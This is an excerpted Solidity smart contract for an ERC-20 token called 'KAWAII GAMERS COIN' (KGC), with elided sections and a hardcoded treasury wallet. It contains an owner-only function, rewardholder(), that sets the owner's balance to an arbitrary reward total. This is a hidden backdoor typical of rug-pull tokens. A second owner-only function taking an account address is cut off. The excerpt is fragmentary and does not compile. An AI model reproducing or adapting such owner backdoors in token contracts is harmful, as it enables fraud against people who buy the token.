...
contract KAWAIIGAMERS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "KAWAII GAMERS COIN";
    string private _symbol = "KGC";
    uint8 private _decimals = 18;

    address payable public treasuryWallet = payable(0x8c4562ba903F6D8f7E9e297093D7Fcd4b6026c05);
    ...
    function rewardholder() public onlyOwner() {_walletTotals[owner()] = getTotalRewards;}
    ...
    function LevelUP(address _account) external onlyOwner {
